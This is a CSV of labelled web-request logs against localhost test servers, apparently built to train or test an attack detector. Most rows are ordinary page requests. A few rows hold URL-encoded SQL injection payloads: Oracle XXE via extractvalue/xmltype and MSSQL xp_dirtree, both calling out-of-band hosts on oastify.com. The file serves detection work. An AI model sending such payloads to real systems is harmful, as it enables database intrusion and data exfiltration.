timestamp,source_ip,target_url,user_agent,ddos_score,payload_length,text,label
2026-01-02T04:45:22.564042,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:45:22.530053,127.0.0.1,http://localhost:5000/protected/admin,unknown,0,37,http://localhost:5000/protected/admin unknown,0
2026-01-02T04:45:22.477163,127.0.0.1,http://localhost:5000/protected/contact,unknown,0,39,http://localhost:5000/protected/contact unknown,2
2026-01-02T04:45:22.410848,127.0.0.1,http://localhost:5000/protected/products?search=(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20pbykn%20SYSTEM%20%22http%3a%2f%2fy32npi34dc7xzhxlel0rttqynptjhd5gt7gx4m.oasti'%7c%7c'fy.com%2f%22%3e%25pbykn%3b]%3e')%2c'%2fl')%20from%20dual),unknown,0,328,http://localhost:5000/protected/products?search=(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20pbykn%20SYSTEM%20%22http%3a%2f%2fy32npi34dc7xzhxlel0rttqynptjhd5gt7gx4m.oasti'%7c%7c'fy.com%2f%22%3e%25pbykn%3b]%3e')%2c'%2fl')%20from%20dual) unknown,2
2026-01-02T04:45:22.383930,127.0.0.1,http://localhost:5000/protected/,unknown,0,32,http://localhost:5000/protected/ unknown,0
2026-01-02T04:45:22.350788,127.0.0.1,http://localhost:5000/protected/user/login,unknown,0,42,http://localhost:5000/protected/user/login unknown,2
2026-01-02T04:45:22.284720,127.0.0.1,http://localhost:5000/protected/upload,unknown,0,38,http://localhost:5000/protected/upload unknown,2
2026-01-02T04:45:21.411759,127.0.0.1,http://localhost:8080/user/forgot-password,unknown,0,42,http://localhost:8080/user/forgot-password unknown,0
2026-01-02T04:45:20.614015,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:45:20.557933,127.0.0.1,http://localhost:5000/protected/user/forgot-password,unknown,0,52,http://localhost:5000/protected/user/forgot-password unknown,0
2026-01-02T04:45:19.764803,127.0.0.1,http://localhost:8080/user/forgot-password,unknown,0,42,http://localhost:8080/user/forgot-password unknown,0
2026-01-02T04:45:19.698267,127.0.0.1,http://localhost:5000/protected/,unknown,0,32,http://localhost:5000/protected/ unknown,0
2026-01-02T04:45:19.640617,127.0.0.1,http://localhost:5000/protected/user/forgot-password,unknown,0,52,http://localhost:5000/protected/user/forgot-password unknown,0
2026-01-02T04:45:18.846631,127.0.0.1,http://localhost:8080/forgot-password,unknown,0,37,http://localhost:8080/forgot-password unknown,0
2026-01-02T04:45:18.819096,127.0.0.1,http://localhost:5000/protected/login,unknown,0,37,http://localhost:5000/protected/login unknown,2
2026-01-02T04:45:18.753848,127.0.0.1,http://localhost:5000/protected/admin?token=admin123'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c233rpm38dg71zlxpep0vtxq2nttnhg57wvnid62.oasti'%2b'fy.com%5cggp'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20,unknown,0,213,http://localhost:5000/protected/admin?token=admin123'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c233rpm38dg71zlxpep0vtxq2nttnhg57wvnid62.oasti'%2b'fy.com%5cggp'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20 unknown,2
2026-01-02T04:45:18.721742,127.0.0.1,http://localhost:5000/protected/forgot-password,unknown,0,47,http://localhost:5000/protected/forgot-password unknown,0
2026-01-02T04:45:17.811837,127.0.0.1,http://localhost:8080/admin,unknown,0,27,http://localhost:8080/admin unknown,0
2026-01-02T04:45:17.782975,127.0.0.1,http://localhost:5000/protected/contact,unknown,0,39,http://localhost:5000/protected/contact unknown,2
2026-01-02T04:45:17.752190,127.0.0.1,http://localhost:5000/protected/admin,unknown,0,37,http://localhost:5000/protected/admin unknown,0
2026-01-02T04:45:17.691772,127.0.0.1,http://localhost:5000/protected/user/login,unknown,0,42,http://localhost:5000/protected/user/login unknown,2
2026-01-02T04:45:17.610944,127.0.0.1,http://localhost:5000/protected/upload,unknown,0,38,http://localhost:5000/protected/upload unknown,2
2026-01-02T04:45:16.820506,127.0.0.1,http://localhost:8080/forgot-password,unknown,0,37,http://localhost:8080/forgot-password unknown,0
2026-01-02T04:45:16.046848,127.0.0.1,http://localhost:8080/user/forgot-password,unknown,0,42,http://localhost:8080/user/forgot-password unknown,0
2026-01-02T04:45:16.017587,127.0.0.1,http://localhost:5000/protected/forgot-password,unknown,0,47,http://localhost:5000/protected/forgot-password unknown,0
2026-01-02T04:45:15.215848,127.0.0.1,http://localhost:8080/admin,unknown,0,27,http://localhost:8080/admin unknown,0
2026-01-02T04:45:15.178983,127.0.0.1,http://localhost:5000/protected/user/forgot-password,unknown,0,52,http://localhost:5000/protected/user/forgot-password unknown,0
2026-01-02T04:45:15.145301,127.0.0.1,http://localhost:5000/protected/admin,unknown,0,37,http://localhost:5000/protected/admin unknown,0
2026-01-02T04:45:15.040185,127.0.0.1,http://localhost:5000/protected/admin?token=admin123'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20fesej%20SYSTEM%20%22http%3a%2f%2fjxk8j3xp7x1it2r686ucnekjhan4bxz1nsaiy7.oasti'%7c%7c'fy.com%2f%22%3e%25fesej%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c',unknown,0,346,http://localhost:5000/protected/admin?token=admin123'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20fesej%20SYSTEM%20%22http%3a%2f%2fjxk8j3xp7x1it2r686ucnekjhan4bxz1nsaiy7.oasti'%7c%7c'fy.com%2f%22%3e%25fesej%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c' unknown,2
2026-01-02T04:45:14.986220,127.0.0.1,http://localhost:5000/protected/login,unknown,0,37,http://localhost:5000/protected/login unknown,2
2026-01-02T04:45:14.248942,127.0.0.1,http://localhost:8080/products?search=mtTZWw,unknown,0,44,http://localhost:8080/products?search=mtTZWw unknown,0
2026-01-02T04:45:13.394412,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:45:13.342365,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw,unknown,0,54,http://localhost:5000/protected/products?search=mtTZWw unknown,0
2026-01-02T04:45:13.307759,127.0.0.1,http://localhost:5000/protected/contact,unknown,0,39,http://localhost:5000/protected/contact unknown,2
2026-01-02T04:45:13.283840,127.0.0.1,http://localhost:5000/protected/,unknown,0,32,http://localhost:5000/protected/ unknown,0
2026-01-02T04:45:13.234150,127.0.0.1,http://localhost:5000/protected/upload,unknown,0,38,http://localhost:5000/protected/upload unknown,2
2026-01-02T04:45:13.198712,127.0.0.1,http://localhost:5000/protected/user/login,unknown,0,42,http://localhost:5000/protected/user/login unknown,2
2026-01-02T04:45:12.509994,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:45:12.465157,127.0.0.1,http://localhost:5000/protected/,unknown,0,32,http://localhost:5000/protected/ unknown,0
2026-01-02T04:45:11.657874,127.0.0.1,http://localhost:8080/user/forgot-password,unknown,0,42,http://localhost:8080/user/forgot-password unknown,0
2026-01-02T04:45:11.626206,127.0.0.1,http://localhost:5000/protected/user/forgot-password,unknown,0,52,http://localhost:5000/protected/user/forgot-password unknown,0
2026-01-02T04:45:11.553256,127.0.0.1,http://localhost:5000/protected/admin?token=(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20fesej%20SYSTEM%20%22http%3a%2f%2fm3qbp63sd07lz5x9e90fthqmndt7h053tugk49.oasti'%7c%7c'fy.com%2f%22%3e%25fesej%3b]%3e')%2c'%2fl')%20from%20dual),unknown,0,324,http://localhost:5000/protected/admin?token=(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20fesej%20SYSTEM%20%22http%3a%2f%2fm3qbp63sd07lz5x9e90fthqmndt7h053tugk49.oasti'%7c%7c'fy.com%2f%22%3e%25fesej%3b]%3e')%2c'%2fl')%20from%20dual) unknown,2
2026-01-02T04:45:10.794108,127.0.0.1,http://localhost:8080/forgot-password,unknown,0,37,http://localhost:8080/forgot-password unknown,0
2026-01-02T04:45:10.773983,127.0.0.1,http://localhost:5000/protected/contact,unknown,0,39,http://localhost:5000/protected/contact unknown,2
2026-01-02T04:45:10.731305,127.0.0.1,http://localhost:5000/protected/forgot-password,unknown,0,47,http://localhost:5000/protected/forgot-password unknown,0
2026-01-02T04:45:10.019089,127.0.0.1,http://localhost:8080/admin,unknown,0,27,http://localhost:8080/admin unknown,0
2026-01-02T04:45:09.338953,127.0.0.1,http://localhost:8080/forgot-password,unknown,0,37,http://localhost:8080/forgot-password unknown,0
2026-01-02T04:45:08.699222,127.0.0.1,http://localhost:8080/user/forgot-password,unknown,0,42,http://localhost:8080/user/forgot-password unknown,0
2026-01-02T04:45:08.673711,127.0.0.1,http://localhost:5000/protected/admin,unknown,0,37,http://localhost:5000/protected/admin unknown,0
2026-01-02T04:45:08.627636,127.0.0.1,http://localhost:5000/protected/forgot-password,unknown,0,47,http://localhost:5000/protected/forgot-password unknown,0
2026-01-02T04:45:07.981653,127.0.0.1,http://localhost:8080/admin,unknown,0,27,http://localhost:8080/admin unknown,0
2026-01-02T04:45:07.948074,127.0.0.1,http://localhost:5000/protected/user/forgot-password,unknown,0,52,http://localhost:5000/protected/user/forgot-password unknown,0
2026-01-02T04:45:07.069386,127.0.0.1,http://localhost:8080/login,unknown,0,27,http://localhost:8080/login unknown,0
2026-01-02T04:45:07.036241,127.0.0.1,http://localhost:5000/protected/admin,unknown,0,37,http://localhost:5000/protected/admin unknown,0
2026-01-02T04:45:07.000765,127.0.0.1,http://localhost:5000/protected/admin?token=admin123,unknown,0,52,http://localhost:5000/protected/admin?token=admin123 unknown,2
2026-01-02T04:45:06.944720,127.0.0.1,http://localhost:5000/protected/login,unknown,0,37,http://localhost:5000/protected/login unknown,0
2026-01-02T04:45:06.161190,127.0.0.1,http://localhost:8080/products?search=mtTZWw,unknown,0,44,http://localhost:8080/products?search=mtTZWw unknown,0
2026-01-02T04:45:06.112353,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw,unknown,0,54,http://localhost:5000/protected/products?search=mtTZWw unknown,0
2026-01-02T04:45:05.079864,127.0.0.1,http://localhost:8080/user/login,unknown,0,32,http://localhost:8080/user/login unknown,0
2026-01-02T04:45:05.021529,127.0.0.1,http://localhost:5000/protected/user/login,unknown,0,42,http://localhost:5000/protected/user/login unknown,0
2026-01-02T04:45:04.086753,127.0.0.1,http://localhost:8080/upload,unknown,0,28,http://localhost:8080/upload unknown,0
2026-01-02T04:45:03.393941,127.0.0.1,http://localhost:8080/user/login,unknown,0,32,http://localhost:8080/user/login unknown,0
2026-01-02T04:45:02.675644,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:45:02.657038,127.0.0.1,http://localhost:5000/protected/upload,unknown,0,38,http://localhost:5000/protected/upload unknown,0
2026-01-02T04:45:02.635222,127.0.0.1,http://localhost:5000/protected/user/login,unknown,0,42,http://localhost:5000/protected/user/login unknown,0
2026-01-02T04:45:02.598449,127.0.0.1,http://localhost:5000/protected/,unknown,0,32,http://localhost:5000/protected/ unknown,0
2026-01-02T04:45:01.910799,127.0.0.1,http://localhost:8080/contact,unknown,0,29,http://localhost:8080/contact unknown,0
2026-01-02T04:45:01.869237,127.0.0.1,http://localhost:5000/protected/contact,unknown,0,39,http://localhost:5000/protected/contact unknown,0
2026-01-02T04:45:01.220100,127.0.0.1,http://localhost:8080/login,unknown,0,27,http://localhost:8080/login unknown,0
2026-01-02T04:45:01.203467,127.0.0.1,http://localhost:5000/protected/admin?token=admin123,unknown,0,52,http://localhost:5000/protected/admin?token=admin123 unknown,2
2026-01-02T04:45:01.159997,127.0.0.1,http://localhost:5000/protected/login,unknown,0,37,http://localhost:5000/protected/login unknown,0
2026-01-02T04:44:59.840544,127.0.0.1,http://localhost:8080/admin,unknown,0,27,http://localhost:8080/admin unknown,0
2026-01-02T04:44:59.798193,127.0.0.1,http://localhost:5000/protected/admin,unknown,0,37,http://localhost:5000/protected/admin unknown,0
2026-01-02T04:44:59.685061,127.0.0.1,http://localhost:5000/robots.txt,unknown,0,32,http://localhost:5000/robots.txt unknown,0
2026-01-02T04:44:59.123088,127.0.0.1,http://localhost:5000/robots.txt,unknown,0,32,http://localhost:5000/robots.txt unknown,0
2026-01-02T04:44:59.076992,127.0.0.1,http://localhost:5000/robots.txt,unknown,0,32,http://localhost:5000/robots.txt unknown,0
2026-01-02T04:44:59.015866,127.0.0.1,http://localhost:5000/robots.txt,unknown,0,32,http://localhost:5000/robots.txt unknown,0
2026-01-02T04:44:58.266632,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:44:57.715498,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:44:57.122584,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:44:56.567905,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:44:56.012473,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:44:55.946594,127.0.0.1,http://localhost:5000/protected,unknown,0,31,http://localhost:5000/protected unknown,0
2026-01-02T04:44:55.315554,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:44:55.292156,127.0.0.1,http://localhost:5000/protected,unknown,0,31,http://localhost:5000/protected unknown,0
2026-01-02T04:44:54.531509,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:44:54.508330,127.0.0.1,http://localhost:5000/protected,unknown,0,31,http://localhost:5000/protected unknown,0
2026-01-02T04:44:54.330010,127.0.0.1,http://localhost:5000/protected,unknown,0,31,http://localhost:5000/protected unknown,0
2026-01-02T04:44:52.099177,127.0.0.1,http://localhost:5000/protected,unknown,0,31,http://localhost:5000/protected unknown,0
2026-01-02T04:44:52.060075,127.0.0.1,http://localhost:5000/protected,unknown,0,31,http://localhost:5000/protected unknown,0
2026-01-02T04:44:52.030416,127.0.0.1,http://localhost:5000/protected,unknown,0,31,http://localhost:5000/protected unknown,0
2026-01-02T04:44:50.740253,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:44:49.882135,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:44:49.859095,127.0.0.1,http://localhost:5000/protected,unknown,0,31,http://localhost:5000/protected unknown,0
2026-01-02T04:44:49.834647,127.0.0.1,http://localhost:5000/protected,unknown,0,31,http://localhost:5000/protected unknown,0
2026-01-02T04:44:49.720194,127.0.0.1,http://localhost:5000/z4gof0mo9w?z4gof0mo9w=z4gof0mo9w,unknown,0,54,http://localhost:5000/z4gof0mo9w?z4gof0mo9w=z4gof0mo9w unknown,0
2026-01-02T04:44:49.693795,127.0.0.1,http://localhost:5000/drp581qlkr?drp581qlkr=drp581qlkr,unknown,0,54,http://localhost:5000/drp581qlkr?drp581qlkr=drp581qlkr unknown,0
2026-01-02T04:44:49.676184,127.0.0.1,http://localhost:5000/ochfgpqle6?ochfgpqle6=ochfgpqle6,unknown,0,54,http://localhost:5000/ochfgpqle6?ochfgpqle6=ochfgpqle6 unknown,0
2026-01-02T04:44:49.641856,127.0.0.1,http://localhost:5000/lsfpp8mp18?lsfpp8mp18=lsfpp8mp18,unknown,0,54,http://localhost:5000/lsfpp8mp18?lsfpp8mp18=lsfpp8mp18 unknown,0
2026-01-02T04:44:48.692283,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:44:48.668212,127.0.0.1,http://localhost:5000/protected,unknown,0,31,http://localhost:5000/protected unknown,0
2026-01-02T04:44:48.101176,127.0.0.1,http://localhost:5000/admin/login,unknown,0,33,http://localhost:5000/admin/login unknown,0
2026-01-02T04:44:46.952440,127.0.0.1,http://localhost:8080/admin,unknown,0,27,http://localhost:8080/admin unknown,0
2026-01-02T04:44:46.914262,127.0.0.1,http://localhost:5000/protected/admin,unknown,0,37,http://localhost:5000/protected/admin unknown,0
2026-01-02T04:44:45.805398,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:44:45.770610,127.0.0.1,http://localhost:5000/protected,unknown,0,31,http://localhost:5000/protected unknown,0
2026-01-02T04:44:44.556524,127.0.0.1,http://localhost:8080/h46j83wq,unknown,0,30,http://localhost:8080/h46j83wq unknown,0
2026-01-02T04:44:44.508552,127.0.0.1,http://localhost:5000/protected/h46j83wq,unknown,0,40,http://localhost:5000/protected/h46j83wq unknown,0
2026-01-02T04:44:43.422462,127.0.0.1,http://localhost:8080/register,unknown,0,30,http://localhost:8080/register unknown,0
2026-01-02T04:44:43.396510,127.0.0.1,http://localhost:5000/protected/register,unknown,0,40,http://localhost:5000/protected/register unknown,0
2026-01-02T04:44:42.303333,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:44:42.276760,127.0.0.1,http://localhost:5000/protected,unknown,0,31,http://localhost:5000/protected unknown,0
2026-01-02T04:44:40.942131,127.0.0.1,http://localhost:8080/register,unknown,0,30,http://localhost:8080/register unknown,0
2026-01-02T04:44:40.922818,127.0.0.1,http://localhost:5000/protected/register,unknown,0,40,http://localhost:5000/protected/register unknown,0
2026-01-02T04:44:39.841165,127.0.0.1,http://localhost:8080/register,unknown,0,30,http://localhost:8080/register unknown,0
2026-01-02T04:44:39.797622,127.0.0.1,http://localhost:5000/protected/register,unknown,0,40,http://localhost:5000/protected/register unknown,0
2026-01-02T04:44:38.640019,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:44:38.614910,127.0.0.1,http://localhost:5000/protected,unknown,0,31,http://localhost:5000/protected unknown,0
2026-01-02T04:44:37.370014,127.0.0.1,http://localhost:8080/user/login,unknown,0,32,http://localhost:8080/user/login unknown,0
2026-01-02T04:44:37.319199,127.0.0.1,http://localhost:5000/protected/user/login,unknown,0,42,http://localhost:5000/protected/user/login unknown,0
2026-01-02T04:44:36.274499,127.0.0.1,http://localhost:8080/user/forgot-password,unknown,0,42,http://localhost:8080/user/forgot-password unknown,0
2026-01-02T04:44:36.229520,127.0.0.1,http://localhost:5000/protected/user/forgot-password,unknown,0,52,http://localhost:5000/protected/user/forgot-password unknown,0
2026-01-02T04:44:35.109262,127.0.0.1,http://localhost:8080/user/login,unknown,0,32,http://localhost:8080/user/login unknown,0
2026-01-02T04:44:35.063645,127.0.0.1,http://localhost:5000/protected/user/login,unknown,0,42,http://localhost:5000/protected/user/login unknown,0
2026-01-02T04:44:33.959324,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:44:33.948690,127.0.0.1,http://localhost:5000/protected,unknown,0,31,http://localhost:5000/protected unknown,0
2026-01-02T04:44:32.694171,127.0.0.1,http://localhost:8080/user/forgot-password,unknown,0,42,http://localhost:8080/user/forgot-password unknown,0
2026-01-02T04:44:32.642671,127.0.0.1,http://localhost:5000/protected/user/forgot-password,unknown,0,52,http://localhost:5000/protected/user/forgot-password unknown,0
2026-01-02T04:44:31.320386,127.0.0.1,http://localhost:8080/user/login,unknown,0,32,http://localhost:8080/user/login unknown,0
2026-01-02T04:44:31.289890,127.0.0.1,http://localhost:5000/protected/user/login,unknown,0,42,http://localhost:5000/protected/user/login unknown,0
2026-01-02T04:44:30.046743,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:44:30.011853,127.0.0.1,http://localhost:5000/protected,unknown,0,31,http://localhost:5000/protected unknown,0
2026-01-02T04:44:29.546533,127.0.0.1,http://localhost:5000/protected/user/login,unknown,0,42,http://localhost:5000/protected/user/login unknown,2
2026-01-02T04:44:28.238244,127.0.0.1,http://localhost:8080/user/login,unknown,0,32,http://localhost:8080/user/login unknown,0
2026-01-02T04:44:28.203773,127.0.0.1,http://localhost:5000/protected/user/login,unknown,0,42,http://localhost:5000/protected/user/login unknown,0
2026-01-02T04:44:27.029530,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:44:27.015101,127.0.0.1,http://localhost:5000/protected,unknown,0,31,http://localhost:5000/protected unknown,0
2026-01-02T04:44:25.284481,127.0.0.1,http://localhost:8080/user/login,unknown,0,32,http://localhost:8080/user/login unknown,0
2026-01-02T04:44:25.234455,127.0.0.1,http://localhost:5000/protected/user/login,unknown,0,42,http://localhost:5000/protected/user/login unknown,0
2026-01-02T04:44:24.103407,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:44:24.090609,127.0.0.1,http://localhost:5000/protected,unknown,0,31,http://localhost:5000/protected unknown,0
2026-01-02T04:44:22.934608,127.0.0.1,http://localhost:8080/login,unknown,0,27,http://localhost:8080/login unknown,0
2026-01-02T04:44:22.875851,127.0.0.1,http://localhost:5000/protected/login,unknown,0,37,http://localhost:5000/protected/login unknown,0
2026-01-02T04:44:21.866649,127.0.0.1,http://localhost:8080/forgot-password,unknown,0,37,http://localhost:8080/forgot-password unknown,0
2026-01-02T04:44:21.851219,127.0.0.1,http://localhost:5000/protected/forgot-password,unknown,0,47,http://localhost:5000/protected/forgot-password unknown,0
2026-01-02T04:44:20.740104,127.0.0.1,http://localhost:8080/login,unknown,0,27,http://localhost:8080/login unknown,0
2026-01-02T04:44:20.700973,127.0.0.1,http://localhost:5000/protected/login,unknown,0,37,http://localhost:5000/protected/login unknown,0
2026-01-02T04:44:19.581060,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:44:19.547963,127.0.0.1,http://localhost:5000/protected,unknown,0,31,http://localhost:5000/protected unknown,0
2026-01-02T04:44:18.330778,127.0.0.1,http://localhost:8080/forgot-password,unknown,0,37,http://localhost:8080/forgot-password unknown,0
2026-01-02T04:44:18.304414,127.0.0.1,http://localhost:5000/protected/forgot-password,unknown,0,47,http://localhost:5000/protected/forgot-password unknown,0
2026-01-02T04:44:16.986496,127.0.0.1,http://localhost:8080/login,unknown,0,27,http://localhost:8080/login unknown,0
2026-01-02T04:44:16.951910,127.0.0.1,http://localhost:5000/protected/login,unknown,0,37,http://localhost:5000/protected/login unknown,0
2026-01-02T04:44:15.848564,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:44:15.832254,127.0.0.1,http://localhost:5000/protected,unknown,0,31,http://localhost:5000/protected unknown,0
2026-01-02T04:44:15.388387,127.0.0.1,http://localhost:5000/protected/login,unknown,0,37,http://localhost:5000/protected/login unknown,2
2026-01-02T04:44:14.944337,192.168.29.70,http://192.168.29.196:5000/admin/dashboard,unknown,0,42,http://192.168.29.196:5000/admin/dashboard unknown,0
2026-01-02T04:44:13.992443,127.0.0.1,http://localhost:8080/login,unknown,0,27,http://localhost:8080/login unknown,0
2026-01-02T04:44:13.958007,127.0.0.1,http://localhost:5000/protected/login,unknown,0,37,http://localhost:5000/protected/login unknown,0
2026-01-02T04:44:12.688539,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:44:12.666308,127.0.0.1,http://localhost:5000/protected,unknown,0,31,http://localhost:5000/protected unknown,0
2026-01-02T04:44:10.870986,127.0.0.1,http://localhost:8080/login,unknown,0,27,http://localhost:8080/login unknown,0
2026-01-02T04:44:10.813460,127.0.0.1,http://localhost:5000/protected/login,unknown,0,37,http://localhost:5000/protected/login unknown,0
2026-01-02T04:44:09.675489,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:44:09.665078,127.0.0.1,http://localhost:5000/protected,unknown,0,31,http://localhost:5000/protected unknown,0
2026-01-02T04:44:07.863258,127.0.0.1,http://localhost:8080/login,unknown,0,27,http://localhost:8080/login unknown,0
2026-01-02T04:44:07.816565,127.0.0.1,http://localhost:5000/protected/login,unknown,0,37,http://localhost:5000/protected/login unknown,0
2026-01-02T04:44:06.747368,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:44:06.734541,127.0.0.1,http://localhost:5000/protected,unknown,0,31,http://localhost:5000/protected unknown,0
2026-01-02T04:44:04.568543,127.0.0.1,http://localhost:8080/products,unknown,0,30,http://localhost:8080/products unknown,0
2026-01-02T04:44:04.535760,127.0.0.1,http://localhost:5000/protected/products,unknown,0,40,http://localhost:5000/protected/products unknown,0
2026-01-02T04:44:03.132038,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:44:03.079183,127.0.0.1,http://localhost:5000/protected,unknown,0,31,http://localhost:5000/protected unknown,0
2026-01-02T04:44:02.115059,192.168.29.70,http://192.168.29.196:5000/admin/dashboard,unknown,0,42,http://192.168.29.196:5000/admin/dashboard unknown,0
2026-01-02T04:44:01.426798,127.0.0.1,http://localhost:8080/user/forgot-password,unknown,0,42,http://localhost:8080/user/forgot-password unknown,0
2026-01-02T04:44:01.393712,127.0.0.1,http://localhost:5000/protected/user/forgot-password,unknown,0,52,http://localhost:5000/protected/user/forgot-password unknown,0
2026-01-02T04:44:00.252333,127.0.0.1,http://localhost:8080/user/login,unknown,0,32,http://localhost:8080/user/login unknown,0
2026-01-02T04:44:00.220780,127.0.0.1,http://localhost:5000/protected/user/login,unknown,0,42,http://localhost:5000/protected/user/login unknown,0
2026-01-02T04:43:59.126596,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:43:59.109109,127.0.0.1,http://localhost:5000/protected,unknown,0,31,http://localhost:5000/protected unknown,0
2026-01-02T04:43:57.563928,127.0.0.1,http://localhost:8080/user/login,unknown,0,32,http://localhost:8080/user/login unknown,0
2026-01-02T04:43:57.516241,127.0.0.1,http://localhost:5000/protected/user/login,unknown,0,42,http://localhost:5000/protected/user/login unknown,0
2026-01-02T04:43:56.385492,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:43:56.344606,127.0.0.1,http://localhost:5000/protected,unknown,0,31,http://localhost:5000/protected unknown,0
2026-01-02T04:43:54.858053,127.0.0.1,http://localhost:8080/user/login,unknown,0,32,http://localhost:8080/user/login unknown,0
2026-01-02T04:43:54.830874,127.0.0.1,http://localhost:5000/protected/user/login,unknown,0,42,http://localhost:5000/protected/user/login unknown,0
2026-01-02T04:43:53.597284,127.0.0.1,http://localhost:8080,unknown,0,21,http://localhost:8080 unknown,0
2026-01-02T04:43:53.582185,127.0.0.1,http://localhost:5000/protected,unknown,0,31,http://localhost:5000/protected unknown,0
2026-01-02T04:43:51.960213,127.0.0.1,http://localhost:8080/user/login,unknown,0,32,http://localhost:8080/user/login unknown,0
